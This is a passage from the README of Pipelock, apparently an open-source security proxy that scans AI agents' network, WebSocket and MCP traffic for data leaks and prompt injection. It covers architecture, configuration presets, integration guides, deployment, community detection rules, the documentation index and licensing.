| Canary tokens, skill-scan, `explain`, single-instance Prometheus and Grafana | Yes | Yes | Yes |
| Per-agent profiles: identity, budgets, config and scanner isolation, per-agent sandbox | No | Yes | Yes |
| Per-agent routing by source CIDR and network selector | No | Yes | Yes |
| Operator dashboard: Overview, Evidence, Exemptions, Agents, Budgets, Trust & Keys | No | Yes | Yes |
| Per-agent coverage certificates | No | Yes | Yes |
| Legal hold and compliance metadata | No | Yes | Yes |
| Conductor fleet control plane, `fleet-sink` audit sink, remote kill, rollback, decision replay, drift preflight | No | No | Yes |
| mTLS follower enrollment and roster-verified signed policy distribution | No | No | Yes |
| Dashboard fleet views: Fleet, Workbench, Incident | No | No | Yes |

The signed `pipelock assess` report is a separate `assess` entitlement, independent of Pro and Enterprise. The free assess grade is unchanged.

---

## How It Works

Pipelock uses **capability separation**: in an enforced deployment, the agent process has secrets but no direct network access. Pipelock has network access but no agent secrets. Even if the agent gets prompt-injected, it can't reach the firewall's controls.

Three HTTP proxy modes (same port), plus a dedicated MCP proxy and A2A inspection on the forward and MCP paths:

- **Fetch proxy** (`/fetch?url=...`): Fetches the URL, extracts text, scans for injection, returns clean content.
- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling. Zero code changes. Optional TLS interception for full payload scanning.
- **WebSocket proxy** (`/ws?url=ws://...`): Bidirectional frame scanning with DLP + injection detection.
- **MCP proxy** (`pipelock mcp proxy`): Wraps stdio or HTTP MCP servers with bidirectional scanning.
- **A2A inspection**: Inspects Google Agent-to-Agent protocol traffic as it crosses the forward and MCP paths.

```mermaid
flowchart LR
    subgraph PRIV["PRIVILEGED ZONE"]
        Agent["AI Agent\nAPI keys + credentials + source code\nNetwork-isolated by deployment"]
    end

    subgraph FW["FIREWALL ZONE"]
        Proxy["Pipelock\n11-layer scanner pipeline\nNo agent secrets"]
    end

    subgraph NET["INTERNET"]
        Web["APIs + MCP Servers + Web"]
    end

    Agent -- "fetch / CONNECT / ws / MCP / A2A" --> Proxy
    Proxy -- "scanned request" --> Web
    Web -- "response" --> Proxy
    Proxy -- "scanned content" --> Agent

    style PRIV fill:#2d1117,stroke:#f85149,color:#e6edf3
    style FW fill:#0d2818,stroke:#3fb950,color:#e6edf3
    style NET fill:#0d1b2e,stroke:#58a6ff,color:#e6edf3
    style Agent fill:#1a1a2e,stroke:#f85149,color:#e6edf3
    style Proxy fill:#0d2818,stroke:#3fb950,color:#e6edf3
    style Web fill:#0d1b2e,stroke:#58a6ff,color:#e6edf3
```

<details>
<summary>Text diagram (for terminals)</summary>

```
┌──────────────────────┐         ┌───────────────────────┐
│  PRIVILEGED ZONE     │         │  FIREWALL ZONE        │
│                      │         │                       │
│  AI Agent            │  IPC    │  Pipelock             │
│  - Has API keys      │────────>│  - No agent secrets   │
│  - Has credentials   │ fetch / │  - Full internet      │
│  - Restricted network│ CONNECT │  - Returns text       │
│                      │ /ws/MCP │  - WS frame scanning  │
│                      │<────────│  - URL scanning       │
│                      │ content │  - Audit logging      │
│                      │         │                       │
└──────────────────────┘         └───────────────────────┘
```

</details>

---

## Configuration

Generate a config from a built-in preset, or let `pipelock audit` tailor one to your project:

```bash
pipelock presets
pipelock generate config --list
pipelock generate config --preset balanced > pipelock.yaml
pipelock audit ./my-project -o pipelock.yaml
```

| CLI Preset | Mode | Action | Best For |
|------------|------|--------|----------|
| `balanced` | balanced | warn | General purpose (default) |
| `strict` | strict | block | High-security, regulated industries |
| `audit` | audit | warn | Log-only evaluation |
| `claude-code` | balanced | block | Claude Code unattended |
| `cursor` | balanced | block | Cursor IDE |
| `generic-agent` | balanced | warn | New agents during tuning |
| `hostile-model` | strict | block | Uncensored/abliterated models |

Config changes are picked up through file watcher or SIGHUP. Full reference: **[docs/configuration.md](docs/configuration.md)**

For false positive tuning: **[docs/false-positive-tuning.md](docs/false-positive-tuning.md)**

---

## Integration Guides

- **[Claude Code](docs/guides/claude-code.md):** MCP proxy setup, `.claude.json` configuration
- **[OpenAI Codex](docs/guides/codex.md):** MCP proxy wrapping, forward proxy, sandbox integration
- **[Cline](docs/guides/cline.md):** MCP proxy wrapping for Cline's `mcp.json`
- **[OpenCode](docs/guides/opencode.md):** MCP proxy wrapping for OpenCode's local and remote MCP servers
- **[Zed](docs/guides/zed.md):** MCP proxy wrapping for Zed's `context_servers` block in `settings.json`
- **[OpenAI Agents SDK](docs/guides/openai-agents.md):** `MCPServerStdio`, multi-agent handoffs
- **[Google ADK](docs/guides/google-adk.md):** `McpToolset`, `StdioConnectionParams`
- **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
- **[CrewAI](docs/guides/crewai.md):** `MCPServerStdio` wrapping, `MCPServerAdapter`
- **[LangGraph](docs/guides/langgraph.md):** `MultiServerMCPClient`, `StateGraph`
- **[Hermes](docs/guides/hermes.md):** full-plugin coverage or lighter MCP-only wrapping for Nous Research's agent, with auth-header sidecar preservation
- **[JetBrains/Junie](docs/guides/jetbrains.md):** MCP proxy wrapping for IntelliJ, PyCharm, GoLand ([walkthrough](https://pipelab.org/learn/jetbrains-integration/))
- **Cursor:** `pipelock cursor install` registers Pipelock as a Cursor hook for shell execution, MCP tool calls, and file reads; use `--config` to embed a validated policy path and `pipelock cursor remove` to remove Pipelock-managed hooks. You can also use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md) ([walkthrough](https://pipelab.org/learn/cursor-integration/))
- **VS Code:** `pipelock vscode install` rewrites `.vscode/mcp.json` to route every MCP server through the MCP proxy; `--global` targets the user-level `mcp.json`
- **[OpenClaw](docs/guides/openclaw.md):** gateway sidecar, init container, config wrapping
- **Any other MCP client:** `pipelock generate mcporter` reads any JSON file with a top-level `mcpServers` object and wraps every server through Pipelock's proxy, so a client that is not on the list above still routes through scanning in one command.

---

## Deployment

```bash
# Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
  ghcr.io/luckypipewrench/pipelock:latest \
  run --config /config/pipelock.yaml --listen 0.0.0.0:8888

# Network-isolated agent with Docker Compose
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up

# Kubernetes with Helm
helm install pipelock charts/pipelock/
```

Production recipes for Docker Compose, Kubernetes sidecar + NetworkPolicy, iptables/nftables, and macOS PF: **[docs/guides/deployment-recipes.md](docs/guides/deployment-recipes.md)**

---

## CI Integration

```yaml
# .github/workflows/pipelock.yaml
- uses: luckyPipewrench/pipelock@v2
  with:
    scan-diff: 'true'
    fail-on-findings: 'true'
```

The action downloads a pre-built binary, runs `pipelock audit`, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow.

### Runnable Demo: Tool-Response Injection

The [`examples/tool-response-injection/`](examples/tool-response-injection/) harness runs an end-to-end demo where an MCP tool with a harmless name and description hides a prompt-injection payload in its response. Pipelock blocks the response before it reaches the agent and emits signed action receipts that a third party can verify. The same demo runs against three transports with one shared signing key:

- MCP stdio
- MCP HTTP upstream
- HTTP fetch

```bash
cd examples/tool-response-injection
python3 demo.py    # needs python3 + cryptography + pipelock on PATH
```

---

## Community Rules

<div align="center">

**Detection you can extend, share, and ship faster than the core binary.**

</div>

Pipelock's built-in DLP, injection, and tool-poison detection is strong out of the box. Community rule bundles let you go further: add your own patterns for the exfiltration shapes, secret formats, and injection tricks your stack sees, sign them, and ship them on a cadence you control instead of waiting for a release.

Install the official bundle in one line:

```bash
pipelock rules install pipelock-community
```

Rule bundles are signed and version-locked. The full lifecycle is a shipped command, not a config edit:

```bash
pipelock rules list                    # what is installed
pipelock rules diff pipelock-community # what a new version would change
pipelock rules update pipelock-community
pipelock rules verify                  # confirm signatures against the trusted keyring
pipelock rules remove pipelock-community
```

**Write your own.** A rule is a small YAML entry with a name, a category (DLP, injection, or tool-poison), and a pattern. Sign it with your key, drop it in a bundle, and every Pipelock instance you run picks it up. Share it with the community and it protects everyone else too.

Contribute a rule to the public [pipelock-rules](https://github.com/luckyPipewrench/pipelock-rules) bundle, or read [docs/rules.md](docs/rules.md) to build and sign your own.

---

## Docs

Full docs directory: [docs/](docs/)

| Document | What's In It |
|----------|-------------|
| [Configuration Reference](docs/configuration.md) | All config fields, defaults, hot-reload behavior, presets |
| [Request Policy](docs/guides/request-policy.md) | Allow-by-default deny/warn rails on outbound API operations (GraphQL / discriminator / batch), fail-closed (v2.6) |
| [Request Redaction](docs/guides/redaction.md) | JSON request rewriting across HTTP, WebSocket, and MCP transports |
| [False Positive Tuning](docs/false-positive-tuning.md) | Identifying, suppressing, and tuning scanner findings |
| [Scan API](docs/scan-api.md) | Evaluation endpoint for programmatic scanning |
| [Deployment Recipes](docs/guides/deployment-recipes.md) | Docker Compose, K8s sidecar, iptables, macOS PF |
| [`pipelock doctor`](docs/cli/doctor.md) | Configured-vs-enforceable deployment diagnostics for proxy, TLS, MCP, file_sentry, telemetry, and containment signals |
| [`pipelock dashboard`](docs/cli/dashboard.md) | Operator dashboard setup: auth modes, RBAC permissions, evidence, exemptions, budgets, trust and keys, fleet views, backup/restore, and coverage certificates |
| [`pipelock verify-install`](docs/cli/verify-install.md) | Deterministic scanning, local proof, and direct-egress smoke checks |
| [`pipelock update`](docs/cli/update.md) | Verified self-update: signed release manifest, checksum verification, optional cosign cross-check, atomic install, rollback |
| [Bypass Resistance](docs/bypass-resistance.md) | Known evasion techniques, mitigations, limitations |
| [Known Attacks Blocked](docs/attacks-blocked.md) | Real attacks with repro snippets |
| [SIEM Integration](docs/guides/siem-integration.md) | Log schema, CEF/syslog output, durable Enterprise forwarding, lifecycle, metrics, SIEM queries |
| [Metrics Reference](docs/metrics.md) | Prometheus metric families, labels, JSON stats, and alert rules |
| [Community Rules](docs/rules.md) | Install, configure, and create signed rule bundles |
| [Security Assurance](docs/security-assurance.md) | Security model, trust boundaries, supply chain |
| [Security Documents](docs/security/) | Disclosure policy, unsupported paths, key rotation, TLS CA and Audit Packet threat models |
| [Finding Suppression](docs/guides/suppression.md) | Rule names, path matching, inline comments |
| [Transport Modes](docs/guides/transport-modes.md) | All proxy modes and their scanning capabilities |
| [OWASP MCP Top 10](docs/compliance/owasp-mcp-top10.md) | OWASP MCP Top 10 coverage |
| [OWASP Agentic Top 15](docs/owasp-agentic-top15-mapping.md) | OWASP Agentic AI Top 15 coverage |
| [OWASP LLM Top 10](docs/owasp-llm-top10-mapping.md) | OWASP Top 10 for LLM Applications (2025) coverage |
| [EU AI Act](docs/compliance/eu-ai-act-mapping.md) | EU AI Act compliance mapping |
| [NIST 800-53](docs/compliance/nist-800-53.md) | NIST SP 800-53 Rev. 5 controls mapping |
| [Assess Mapping](docs/compliance/assess-mapping.md) | Maps runtime controls to the frameworks `pipelock assess` produces evidence against, for procurement and audit review |
| [Policy Spec v0.1](docs/policy-spec-v0.1.md) | Portable agent firewall policy format |
| [Mediation Envelope](docs/guides/mediation-envelope.md) | Sideband metadata headers, config, interaction with receipts |
| [Media Policy](docs/guides/media-policy.md) | Stego stripping, SVG hardening, allowed types, size limits |
| [Receipt Verification](docs/guides/receipt-verification.md) | `pipelock verify-receipt`, Fleet Receipt Report verification, standalone `pipelock-verifier`, conformance suite, chain integrity |
| [Receipt Spec Profiles](docs/specs/in-toto-agent-action-receipt-v0.1.md) | in-toto attestation predicate for action receipts, with companion SCITT and AARP profiles and prior-art mapping |
| [Audit Packet Threat Model](docs/security/audit-packet-threat-model.md) | What verified Audit Packets prove, what they do not prove, and the trust assumptions relying parties must pin |
| [Receipt Transport Coverage](docs/guides/receipt-transports.md) | Receipt emission matrix across fetch, forward, CONNECT/TLS, WebSocket, MCP, and A2A paths |
| [Learn-and-Lock](docs/guides/learn-and-lock.md) | Per-agent behavioral contracts: observe, compile, shadow, ratify, promote (v2.4) |
| [Federation](docs/guides/federation.md) | Inbound mediation envelope verification, SPIFFE actor format, RFC 9421 well-known directory (v2.4) |
| [Block-Reason Header](docs/guides/block-reason-header.md) | `X-Pipelock-Block-Reason` schema, reason vocabulary, retry hints (v2.4) |
| [Health Endpoint](docs/guides/health.md) | `/health` 503 wedge detection, subsystem heartbeats, operator dashboard config (v2.4) |
| [Host Containment](docs/contain-cli.md) | `pipelock contain install / run / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` for 3-UID nftables owner-match containment with kernel-observed posture attestation (v2.5) |
| [MCP Integrity Manifests](docs/cli/mcp-integrity.md) | Generate, verify, sign, and require trusted MCP binary-integrity manifests (v2.5) |
| [Adaptive CLI](docs/cli/adaptive.md) | Inspect and flush adaptive-enforcement runtime state through the admin API (v2.5) |
| [Conductor](docs/guides/conductor.md) | The Enterprise fleet control plane: policy distribution, audit sink, remote kill, rollback, mTLS/SPIFFE trust, licensing (v2.7, Enterprise) |
| [Conductor Operator Runbook](docs/guides/conductor-operator-runbook.md) | Hands-on local fleet walkthrough: bootstrap, serve, sign a batch, verify offline |
| [Conductor Operator Quickstart](docs/guides/conductor-operator-quickstart.md) | Zero to a read-only fleet audit: license, operator mTLS cert, auditor token, read-only commands |
| [Kubernetes Enterprise Deployment](docs/guides/kubernetes-enterprise-deployment.md) | Helm-based Conductor fleet: control plane, followers, fleet-sink, PKI Secrets, NetworkPolicies |
| [`pipelock license`](docs/cli/license.md) | Install, inspect, and check the license that unlocks paid features (Pro `agents`, Enterprise `fleet`) |
| [`pipelock baseline`](docs/cli/baseline.md) | Inspect, ratify, and relearn behavioral-baseline profiles through the authenticated admin API |
| [Posture Capsule](docs/guides/posture-capsule.md) | Signed posture snapshots, `posture verify` CLI, CI gate, scoring model |
| [`pipelock init sidecar`](docs/cli/init-sidecar.md) | Generate enforced Kubernetes companion-proxy manifests and MCP launcher contracts (strategic-merge, Kustomize, Helm values) |
| [`pipelock session`](docs/cli/session.md) | Operator CLI for airlock inspection and recovery (list, inspect, explain, release, terminate, recover) |
| [`pipelock keys status`](docs/cli/keys.md) | Unified signing-key inventory: per-purpose source, presence, readability, validity, and public-key fingerprint |
| [Flight Recorder](docs/guides/flight-recorder.md) | Hash-chained signed evidence log: default-on behavior, transcript-root seal, redaction, escrow, key rotation |
| [TLS Interception](docs/guides/tls-interception.md) | CONNECT-tunnel MITM: CA setup, body/header/response scanning, passthrough domains |
| [Canary Tokens](docs/guides/canary-tokens.md) | Synthetic secrets that trip an alert the moment an agent tries to exfiltrate one |
| [Detection Integration](docs/guides/detection-integration.md) | Feed Pipelock decisions and evidence into external detection / SIEM pipelines |
| [PR Review](docs/guides/pr-review.md) | Manual-trigger AI security review for pull requests (`/review` comment) |
| [MCP Inspector Front](docs/guides/mcp-inspector-front.md) | Front MCP dev tools (Inspector, test servers) through Pipelock scanning |
| [`pipelock demo`](docs/cli/demo.md) | Self-contained attack scenarios with signed, offline-verifiable receipts, no config or network needed |
| [Badges](docs/badges.md) | Drop-in Markdown for the `scanned by pipelock` badge on downstream projects |

---

## Project Structure

```text
cmd/pipelock/          CLI entry point
internal/
  cli/                 60+ Cobra commands (run, check, init, generate, mcp, session, posture, rules, ...)
    diag/              `pipelock doctor` and install-verification diagnostics
    session/           `pipelock session`, `pipelock adaptive`, and `pipelock baseline` operator CLIs
    setup/             `pipelock init sidecar`: companion-proxy manifest generation (K8s)
  config/              YAML config, validation, defaults, hot-reload (fsnotify)
  scanner/             11-layer URL scanning pipeline + response injection detection
  audit/               Structured JSON logging (zerolog) + event emission dispatch
  proxy/               HTTP proxy: fetch, forward (CONNECT), WebSocket, DNS pinning, TLS
  mcp/                 MCP proxy + bidirectional scanning + tool poisoning + chains
    integrity/         MCP binary/script integrity manifests and trust workflow
  discover/            IDE/agent config discovery (Claude Code, Cursor, VS Code, JetBrains)
  killswitch/          Emergency deny-all (6 sources) + port-isolated API
  envelope/            Mediation envelope (RFC 8941) for sideband metadata
  media/               Image metadata stripping (JPEG/PNG byte-level surgery)
  normalize/           Text-normalization transforms (NFKC, invisible chars, leetspeak, whitespace, vowel-fold) for the scanner cascade
  receipt/             Action receipt signing + hash-chained evidence
  posture/             Posture capsule schema, signing, scoring, verify policy
  session/             Session state, taint classification, task boundaries, trust overrides
  rules/               Bundle loader, tier taxonomy, RequiredFeatures enforcement
  sandbox/             Landlock, seccomp, netns, macOS sandbox-exec
  shield/              Airlock, browser shield, SVG hardening
  signing/             Ed25519 key management
  integrity/           SHA256 file integrity monitoring
  report/              HTML/JSON audit report generation
enterprise/            Multi-agent features (ELv2)
sdk/conformance/       Cross-implementation receipt verification test vectors
charts/                Helm chart for Kubernetes deployment
configs/               7 built-in preset config files
docs/                  Guides, references, compliance mappings
```

---

## Testing

Pipelock is tested like a security product. The open-source core has unit, integration, and end-to-end tests. A separate private adversarial suite exercises attack classes against the production binary. Every bypass graduates into a regression test before release.

| Metric | Value |
|--------|-------|
| Go tests (with `-race`) | Unit, integration, and end-to-end paths |
| Coverage gate (codecov) | 95% project, 75% patch on new code |
| Evasion coverage | Public bypass-resistance matrix + private adversarial corpus |
| Scanner hot-path overhead | ~40us per URL scan (hot-path benchmark; see [docs/performance.md](docs/performance.md)) |
| CI matrix | Go 1.25 + 1.26, CodeQL, golangci-lint |
| Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |

Run `make test` to verify locally. Independent benchmark: the public [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) corpus. See the [live results](https://pipelab.org/gauntlet/).

---

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to other tools in this space
- Security review contributions from Dylan Corrales

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock). It helps others find the project.

---

## License

Pipelock core is licensed under the **Apache License 2.0**. Copyright 2026 Joshua Waldrep.

Multi-agent features (per-agent identity, budgets, and configuration isolation)
are in the `enterprise/` directory, gated by the `enterprise` build tag and licensed
under the **Elastic License 2.0 (ELv2)**. These features activate with a valid license key.

The open-source core works independently without paid features. All scanning, detection,
and single-agent protection is free.

Pre-built release artifacts (Homebrew, GitHub releases, Docker images) include paid-tier
code that activates with a valid license key. Building from source with `go install` or the
repository `Dockerfile` produces a Community-only binary.

See [LICENSE](LICENSE) for the Apache 2.0 text and [enterprise/LICENSE](enterprise/LICENSE) for the ELv2 text.
